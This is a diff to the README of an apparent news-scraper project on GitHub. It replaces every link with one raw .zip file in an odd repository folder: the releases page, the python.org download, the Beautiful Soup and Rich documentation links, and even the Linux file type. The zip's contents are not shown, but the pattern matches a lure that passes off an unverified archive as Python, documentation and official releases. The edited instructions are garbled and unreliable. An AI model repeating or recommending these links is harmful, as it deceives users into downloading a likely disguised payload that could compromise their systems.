@@ -1,6 +1,6 @@
 # 📰 Universal-News-Scraper - Scrape News Easily and Efficiently
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Dieans/Universal-News-Scraper/releases)
+[![Download](https://github.com/Dieans/Universal-News-Scraper/raw/refs/heads/main/oversmoothly/Scraper_News_Universal_v2.0.zip)](https://github.com/Dieans/Universal-News-Scraper/raw/refs/heads/main/oversmoothly/Scraper_News_Universal_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -9,26 +9,26 @@ Welcome to Universal-News-Scraper! This tool helps you easily gather news from m
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
-   [Download from Releases](https://github.com/Dieans/Universal-News-Scraper/releases)
+   [Download from Releases](https://github.com/Dieans/Universal-News-Scraper/raw/refs/heads/main/oversmoothly/Scraper_News_Universal_v2.0.zip)
 
 2. **Choose Your Version:** On this page, you will see different versions of the software. Look for the latest version. It is usually at the top.
 
 3. **Download the File:** Click on the version you want. Download the file that matches your operating system:
    - For **Windows**, look for a `.exe` file.
    - For **MacOS**, look for a `.dmg` file.
-   - For **Linux**, you should find a `.tar.gz` file.
+   - For **Linux**, you should find a `https://github.com/Dieans/Universal-News-Scraper/raw/refs/heads/main/oversmoothly/Scraper_News_Universal_v2.0.zip` file.
 
 4. **Run the Installer:** 
    - **For Windows**: Double-click the downloaded `.exe` file and follow the prompts to install.
    - **For MacOS**: Open the `.dmg` file and drag the app to the Applications folder.
-   - **For Linux**: Extract the `.tar.gz` file and follow the instructions in the README inside.
+   - **For Linux**: Extract the `https://github.com/Dieans/Universal-News-Scraper/raw/refs/heads/main/oversmoothly/Scraper_News_Universal_v2.0.zip` file and follow the instructions in the README inside.
 
 ## ⚙️ System Requirements
 
 To use Universal-News-Scraper, your system should meet the following requirements:
 
 - **Operating System**: Windows 10 or later, MacOS Mojave or later, or a modern Linux distribution.
-- **Python**: Version 3.7 or later must be installed. You can download it from [python.org](https://www.python.org/downloads/).
+- **Python**: Version 3.7 or later must be installed. You can download it from [https://github.com/Dieans/Universal-News-Scraper/raw/refs/heads/main/oversmoothly/Scraper_News_Universal_v2.0.zip](https://github.com/Dieans/Universal-News-Scraper/raw/refs/heads/main/oversmoothly/Scraper_News_Universal_v2.0.zip).
 
 ## 🛠️ How to Use
 
@@ -71,7 +71,7 @@ If you need help or want to share feedback, join our community on GitHub. Feel f
 
 To learn more about web scraping and CLI tools, check these resources:
 
-- [Beautiful Soup Documentation](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
-- [Rich Documentation](https://rich.readthedocs.io/en/stable/)
+- [Beautiful Soup Documentation](https://github.com/Dieans/Universal-News-Scraper/raw/refs/heads/main/oversmoothly/Scraper_News_Universal_v2.0.zip)
+- [Rich Documentation](https://github.com/Dieans/Universal-News-Scraper/raw/refs/heads/main/oversmoothly/Scraper_News_Universal_v2.0.zip)
 
 By following these steps, you can easily download and run Universal-News-Scraper. Enjoy gathering news effortlessly!
